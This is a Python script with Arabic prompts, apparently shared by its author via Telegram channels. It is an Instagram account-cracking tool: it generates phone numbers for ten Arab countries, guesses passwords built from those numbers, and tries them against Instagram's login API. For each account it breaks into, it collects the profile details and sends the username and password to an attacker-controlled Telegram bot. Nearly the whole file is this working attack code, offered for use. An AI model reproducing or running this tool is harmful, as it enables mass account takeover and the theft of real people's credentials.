#============مكاتب==============
from time import sleep
import webbrowser
import random
import requests
from user_agent import generate_user_agent
import json
from secrets import token_hex
import secrets
import os
import sys
import uuid
from uuid import uuid4
from time import sleep
import webbrowser
import pyfiglet 
import time
aa=0
zz=0
#--------------------------الوان متكررهه------------------
E = '\033[1;31m'
G = '\033[1;32m'
S = '\033[1;33m'
Z = '\033[1;31m' #احمر
X = '\033[1;33m' #اصفر
Z1 = '\033[2;31m' #احمر ثاني
F = '\033[2;32m' #اخضر
A = '\033[2;39m' #ازرق
C = '\033[2;35m' #وردي
B = '\033[2;36m'#سمائي
Y = '\033[1;34m' #ازرق فاتح
Z2 = '\033[1;31m' #احمر
X = '\033[1;33m' #اصفر
Z1 = '\033[2;31m' #احمر ثاني
F = '\033[2;32m' #اخضر
A = '\033[2;39m' #ازرق
C = '\033[2;35m' #وردي
B = '\033[2;36m'#سمائي
Y = '\033[1;34m' #ازرق فاتح
E1 = '\x1b[1;31m' # احمر
G1 = '\x1b[1;32m'
S1 = '\x1b[1;33m'
Z = '\x1b[2;31m'
G2 = '\x1b[1;32m'
E = '\x1b[1;31m'
G = '\x1b[1;32m'
S = '\x1b[1;33m'
import time
timee=time.asctime()
print(timee)
print(' ')
def j(z):
    for e in z:
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(3/100)


os.system("clear") 
print('   ') 
print('   ')
def a(z):
    for e in z:
     sys.stdout.write(e) 
     sys.stdout.flush() 
     sleep(260/10000)
import time

print(S+ """**********
_/﹋\_
 (҂`_´)
 <,︻╦╤─ ҉ - - -BGASOS
 _/﹋\_
@RX999
ALi-ajb**********
قناتي على التلكرام 
@Begasos1   -----------""")
print(' ')
def j(z):
    for e in z:
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(3/100)

print('  ')
j(Y+'-'*20)
ask = j(F + '''
1 - Check in العراق
2 - Check in مصر
3 - Check in الاردن
4 - Check in السعوديه
5 - Check in لبنان
6 - Check in سوريا
7 - Check in كويت
8 - Check in تونس
9 - Check in قطر
10 - Check in اليمن
 \n''')  
j(Y+'-'*20)
webbrowser.open('https://t.me/Begasos1');
sleep(3)
print('  ') 
tok = input (''+B+'('+A+'!'+X+')'+B+'  oادخل التوكنo  :  '+F)
print('  ')
ID = input (''+B+'('+A+'!'+X+')'+B+'  oادخل الايديo :  '+F)
print(' ') 
shuger = input (''+B+'('+A+'!'+X+')'+B+'  oاختر دوله للصيد 🌹o  :  '+F)
print('  ')
er = input (''+B+'('+A+'!'+X+')'+B+'  oادخل-مفتاح الرقم حسب دولتكo :  '+F) 
print('  ') 
print('  ')
j('-'*30)
print('  ')
import time
t = time.localtime()
current_time = time.strftime("%H:%M:%S", t)
print('  ') 
sleep(2)
start_msg = requests.post(f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={ID}&text= تم،راح ادورلك مطي🐴🐴").json()
id_msg	=(start_msg['result']["message_id"])
def code_mrko(userQ,password):
	cookie = secrets.token_hex(8)*2
	head = {
        'HOST': "www.instagram.com",
        'KeepAlive' : 'True',
        'user-agent' : "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.73 Safari/537.36",
        'Cookie': 'cookie',
        'Accept' : "*/*",
        'ContentType' : "application/x-www-form-urlencoded",
        "X-Requested-With" : "XMLHttpRequest",
        "X-IG-App-ID": "936619743392459",
        "X-Instagram-AJAX" : "missing",
        "X-CSRFToken" : "missing",
        "Accept-Language" : "en-US,en;q=0.9"
}
	url_id = f'https://www.instagram.com/{userQ}/?__a=1'
	req_id= requests.get(url_id,headers=head).json()
	name    = str(req_id['graphql']['user']['full_name'])
	id    = str(req_id['graphql']['user']['id'])
	followes    = str(req_id['graphql']['user']['edge_followed_by']['count'])
	following    = str(req_id['graphql']['user']['edge_follow']['count'])
	isp    = str(req_id['graphql']['user']['is_private'])
	idd    = str(req_id['graphql']['user']['id'])
	bio    = str(req_id['graphql']['user']['biography'])
	re = requests.get(f"https://o7aa.pythonanywhere.com/?id={id}")   
	ree = re.json()
	dat = ree['data']
	shug = (f"""

تعال جبتلك مطي ربطه🐴
= = = = = = = = = = = = = = =
⌯ 𝐧𝐚𝐦𝐞 : {name}
⌯ 𝐮𝐬𝐞𝐫 : {userQ}
⌯ 𝐩𝐚𝐬𝐬 : {password}
⌯ 𝐢𝐝 : {idd}  
⌯ 𝐟𝐨𝐥𝐥𝐨𝐰𝐞𝐫𝐬 : {followes}
⌯ 𝐟𝐨𝐥𝐥𝐨𝐰𝐢𝐧𝐠 : {following}
⌯ 𝐝𝐚𝐭𝐚 : {dat}
⌯ 𝐩𝐫𝐢𝐯𝐚𝐭𝐞 : {isp} 
⌯ 𝐛𝐢𝐨 : {bio} 
⌯ 𝐭𝐢𝐦𝐞 : {current_time} 
= = = = = = = = = = = = = = =
⌯ 𝐟𝐫𝐨𝐦 : @X_1_6
 """)
	tlg =(f'''https://api.telegram.org/bot{tok}/sendMessage?chat_id={ID}&text={shug}''')
	i = requests.post(tlg)
	print(G+shug)
 
#N
url='https://i.instagram.com/api/v1/accounts/login/'

headers = {'User-Agent':'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Y6 2019 pream; angler; angler; en_US)', 

             'Accept':'*/*', 

             'Cookie':'missing', 

             'Accept-Encoding':'gzip, deflate', 

             'Accept-Language':'en-US', 

             'X-IG-Capabilities':'3brTvw==', 

             'X-IG-Connection-Type':'WIFI', 

             'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8', 

             'Host':'i.instagram.com'}

w = 'https://pastebin.com/raw/NYyQppJR'
rss = requests.get(w).text
if '[VPN]' in rss:
    sleep(2)
    user = '1234567890'
    while True:
        if shuger == '1':
            us = str("".join(random.choice(user)for i in range(8)))
            username = '+964' + er + us
            password = '0' + er +us 
        if shuger == '2':
            us = str("".join(random.choice(user)for i in range(8)))
            username = '+20' + er + us
            password = '0' + er +us  
        if shuger == '3':
            us = str("".join(random.choice(user)for i in range(7)))
            username = '+962' + er + us
            password = '0' + er +us  
        if shuger == '4':
            us = str("".join(random.choice(user)for i in range(7)))
            username = '+966' + er + us
            password = er +us   
        if shuger == '5':
            us = str("".join(random.choice(user)for i in range(6)))
            username = '+961' + er + us
            password = er +us    
        if shuger == '6':
            us = str("".join(random.choice(user)for i in range(8)))
            username = '+963' + er + us
            password = '0' + er +us
        if shuger == '7':
            us = str("".join(random.choice(user)for i in range(6)))
            username = '+965' + er +us
            password = er +us  
        if shuger == '8':
            us = str("".join(random.choice(user)for i in range(7)))
            username = '+216' + er +us
            password = er +us   
        if shuger == '9':
            us = str("".join(random.choice(user)for i in range(6)))
            username = '+974' + er +us
            password = er +us   
        if shuger == '10':
            us = str("".join(random.choice(user)for i in range(7)))
            username = '+967' + er +us
            password = er +us   
        uid = str(uuid4())              
        data = {
             'uuid':uid, 

             'password':password, 

             'username':username, 

             'device_id':uid, 

             'from_reg':'false', 

             '_csrftoken':'missing', 

             'login_attempt_countn':'0'}
        req= requests.post(url, headers=headers, data=data)        
        if 'logged_in_user' in req.json():
            zz+=1
            userQ = req.json()['logged_in_user']['username']
            code_mrko(userQ,password)
        elif '"message":"challenge_required","challenge"' in req.json():
            print (S+'user : '+username+': passw : '+password)
        else:
            requests.post(f"https://api.telegram.org/bot{tok}/editmessagetext?chat_id={ID}&message_id={id_msg}&text=جاري صيد المطايه احضرو الحبال 🐴\n= = = = = = = = = = = = = ========= =\n\n𝐡𝐢𝐭 : {zz}\n\n𝐛𝐚𝐝 : {aa}\n\n𝐜𝐡𝐞𝐜𝐤 : {password}\n\n𝐭𝐢𝐦𝐞 : {current_time}\n= = = = = = = = = = = = = = =\n\nقناتي تلكرام: @Begasos1 -- كروبي :- @X_1_6")
            
            aa+=1
#===============================

